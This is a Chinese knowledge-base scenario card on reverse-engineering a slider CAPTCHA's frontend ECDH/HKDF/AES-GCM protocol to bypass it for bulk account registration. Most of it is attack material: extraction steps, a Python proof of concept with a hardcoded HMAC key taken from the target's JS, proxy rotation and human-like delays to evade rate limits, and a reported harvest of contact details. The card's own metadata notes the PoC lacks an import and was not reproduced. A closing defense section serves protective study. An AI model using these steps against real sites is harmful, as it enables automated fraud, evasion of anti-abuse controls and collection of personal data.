---
id: web-generic-auth-slider-captcha-ecdh-aes-gcm-protocol-bypass
title: 滑块验证码前端加密协议逆向：ECDH 三密钥 + HKDF + AES-GCM 复刻与批量注册绕过
type: scenario
domain: web
path: web/generic/auth
technique: slider-captcha-frontend-crypto-protocol-bypass
tags:
- web
- auth
- captcha
- reverse-engineering
- ecdh
- hkdf
- aes-gcm
- anti-automation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V102
  verified_at: '2026-11-05T22:37:40+08:00'
  notes: 已对照原文与13张验证码图核对协议、NCC与成功率；PoC 缺 from cryptography.hazmat.primitives import serialization 导入，按示意需补全，未复现。
url: /docs/web/generic/auth/web-generic-auth-slider-captcha-ecdh-aes-gcm-protocol-bypass/
draft: false
kb_aliases:
- 滑块验证码绕过
- TyCaptcha 逆向
- ECDH 验证码协议
- HKDF AES-GCM 滑块
- 前端加密验证码复刻
- 批量注册绕过验证码
---

## 一句话结论

滑块验证码把 ECDH 密钥交换、HKDF 派生、AES-256-GCM 加密和 HMAC 签名全部放在前端 JS 里，并把 HMAC 长期密钥硬编码在混淆代码中；攻击者下载 `captcha.js`、提取密钥并复刻握手后，就能对任意滑块值生成服务端认可的加密请求，配合缺口检测与重试实现批量注册，验证码防护形同虚设。

## 原理

- **握手**：前端生成 3 对 P-256 密钥，把三个公钥与随机 salt 拼成 `d`，按 `keypairs[len(d) % 3]` 选择其中一对作为本次会话密钥；再用硬编码的 32 字节 HMAC 密钥对 `d + n + vk` 做 HMAC-SHA256，提交 `{"d","n","vk","s"}` 到 `/api/captcha/up`。
- **响应解析**：服务端返回 `pubkey_b64.salt_b64.extra` 形式，必须用 `rfind(".")` 从右向左解析；用 `split(".")` 在某些 base64 长度下会错位。这是原文踩过的坑。
- **密钥派生**：用选中的私钥与服务端公钥做 ECDH，得到 shared secret；再以服务端 salt 做 HKDF-SHA256，分别用 `info=b"captcha-aes"` 与 `info=b"captcha-hmac"` 派生出 AES 密钥与 HMAC 密钥。
- **取图与提交**：用派生出的 hmac_key 对随机 `n` 签名，调用 `/api/captcha/get` 获取 `token` 与背景图/拼图块；把检测出的滑块值用 AES-256-GCM 加密（12 字节 IV、AAD=None、明文是浮点数的字符串形式如 `"75.3"`），提交 `{"token","v","n"}` 到 `/api/captcha/verify`，成功后返回 `access_token`。
- **根本问题**：整套“加密”只依赖前端 JS 的不可逆向性。HMAC 长期密钥、HKDF info、AES-GCM 参数都在客户端，攻击者提取后可以完整复刻；服务端只验证密码学封装，不验证“人是否真的拖动过滑块”。
- **缺口检测**：原文最终用 NCC（归一化互相关）加 alpha 遮罩，只对拼图块 alpha>128 的像素计算；单次检测成功率约 20%–25%，配合每次失败后重新握手/取图/检测的重试策略，12 次内通过率约 90%。固定值轮换是错误做法，因为每次失败服务端都会换一张新图。

## 触发条件

- 目标使用滑块/拼图验证码，且验证码协议（密钥交换、加密、签名）在浏览器 JS 中实现；
- 攻击者可下载并分析 `captcha.js`（混淆不构成有效防护）；
- 验证码 token 与注册/登录接口绑定，但服务端只校验密码学封装，没有行为风控或设备指纹；
- 攻击者能访问验证码与注册接口，且可接受一定重试成本（或配合代理池绕过 IP 限制）。

## 利用步骤

1. 下载验证码前端 JS（原文约 126KB 混淆代码），用格式化/反混淆工具定位 `crypto.subtle`、`ECDH`、`HKDF`、`AES-GCM`、`HMAC` 相关调用。
2. 提取硬编码 HMAC 密钥、HKDF 的 `info` 字符串、AES-GCM 参数（IV 长度、AAD、明文格式）与选择密钥的索引逻辑（如 `len(d)%3`）。
3. 用 Python `cryptography`/`httpx` 复刻握手：生成 3 对 P-256、拼 `d`、按索引选密钥、HMAC 签名、提交 `/up`，用 `rfind` 解析服务端返回的公钥与 salt。
4. 完成 ECDH + HKDF，派生 `captcha-aes` 与 `captcha-hmac` 两把密钥。
5. 获取验证码图片，用 NCC + alpha 遮罩检测缺口位置，按页面参数把像素位置换算成提交值（原文 `move_rate=(width/2-front_width)/(width-slider_width)`）。
6. AES-256-GCM 加密滑块值（明文用字符串、AAD=None）、提交 `/verify`；失败则重新握手、取新图、重新检测，而不是复用固定值。
7. 加入 2–3 秒随机等待模拟人类操作；触发 IP 限制时切换 SOCKS5 代理；对注册接口批量执行，统计通过率并保存结果。

## PoC

以下为协议关键步骤的最小化示意（完整脚本需按目标 JS 的实际参数补全）：

```python
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes, hmac
import os, base64, json, httpx

# 1. 三对 P-256，按 d 长度选一对（原文逻辑）
keypairs = [ec.generate_private_key(ec.SECP256R1()) for _ in range(3)]
pub_keys = [base64.b64encode(kp.public_key().public_bytes(
    encoding=serialization.Encoding.X962,
    format=serialization.PublicFormat.UncompressedPoint)).decode() for kp in keypairs]
salt = base64.b64encode(os.urandom(24)).decode()
d = ".".join(pub_keys) + "." + salt
selected = keypairs[len(d) % 3]

# 2. 硬编码 HMAC 密钥（从 captcha.js 提取）
hmac_key = b"jPjwfF3ko#.QXKnf6))L^F)q6M455-q0"
n = base64.b64encode(os.urandom(24)).decode()
vk = os.urandom(5).hex()
h = hmac.HMAC(hmac_key, hashes.SHA256())
h.update((d + n + vk).encode())
s = base64.b64encode(h.finalize()).decode()

r = httpx.post("https://<target>/api/captcha/up", json={"d": d, "n": n, "vk": vk, "s": s})

# 3. 从右向左解析 server_s = pubkey.salt.extra
server_s = r.json()["data"]["s"]
last = server_s.rfind(".")
rest = server_s[:last]
second = rest.rfind(".")
server_pub = base64.b64decode(rest[:second])
server_salt = base64.b64decode(rest[second + 1:])

# 4. ECDH + HKDF
shared = selected.exchange(ec.ECDH(), ec.EllipticCurvePublicKey.from_encoded_point(
    ec.SECP256R1(), server_pub))
aes_key = HKDF(algorithm=hashes.SHA256(), length=32, salt=server_salt,
               info=b"captcha-aes").derive(shared)
hmac_key2 = HKDF(algorithm=hashes.SHA256(), length=32, salt=server_salt,
                 info=b"captcha-hmac").derive(shared)
```

```python
# 5. 提交滑块值：AES-256-GCM，12 字节 IV，AAD=None，明文为字符串
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
iv = os.urandom(12)
ct = AESGCM(aes_key).encrypt(iv, str(value).encode(), None)
httpx.post("https://<target>/api/captcha/verify",
           headers={"X-Captcha-Session": session_id},
           json={"token": captcha_token,
                 "v": base64.b64encode(ct).decode(),
                 "n": base64.b64encode(iv).decode()})
```

原文实测：单次 NCC 检测成功率约 20%–25%，12 次重试内通过率约 90%；批量注册 29 个代理 ID 后成功获取多个代理商的联系方式。

## 变体与关联

- 变体：缺口检测算法可换 Canny 边缘、SSIM、轮廓匹配、阴影检测；原文对比后 NCC + alpha 遮罩最优。
- 变体：固定值重试是常见错误——每轮失败后服务端换新图，必须整轮重新握手/取图/检测。
- 变体：其他前端加密协议（AES-CBC、RSA+AES、3DES）同样可通过提取硬编码密钥复刻；见 [[code-analysis-reverse-obfuscation-js-aes-parameter-restore]] 与 [[web-generic-auth-bastion-frontend-3des-login-forgery]]。
- 关联 [[web-generic-auth-hybrid-rsa-aes-login-bruteforce]]：前端加密登录接口复刻的同类思路，本卡是验证码协议。
- 边界：若服务端在验证码校验中加入设备指纹、行为轨迹、风控评分或服务端签名挑战，单纯复刻密码学协议不足以通过；若 HMAC 密钥可轮换且与账号绑定，复刻成本会上升但并非不可行。

## 检测与防御

- **不要把长期密钥放前端**：验证码协议的服务端密钥、HMAC 密钥必须在服务端；前端只持有一次性挑战/公钥。
- **服务端行为校验**：校验滑块轨迹、时间、设备指纹、IP/会话绑定与风险评分，而不是只校验 AES-GCM 封装。
- **一次性挑战**：每个验证码 token 只能使用一次，失败即失效并换新；绑定 session/IP/账号，防止跨会话重放。
- **速率限制与风控**：对取图、验证、注册接口做多维限流；检测同一 IP/代理池的高频注册、低通过率重试与固定时间间隔。
- **密钥轮换**：怀疑协议被逆向时轮换 HMAC/AES 密钥并更新前端，但这只是提高成本，不能替代服务端行为校验。
- **检测**：监控异常高的验证码通过率、批量注册、同一指纹多账号；对前端 JS 中的硬编码密钥做发布前扫描。
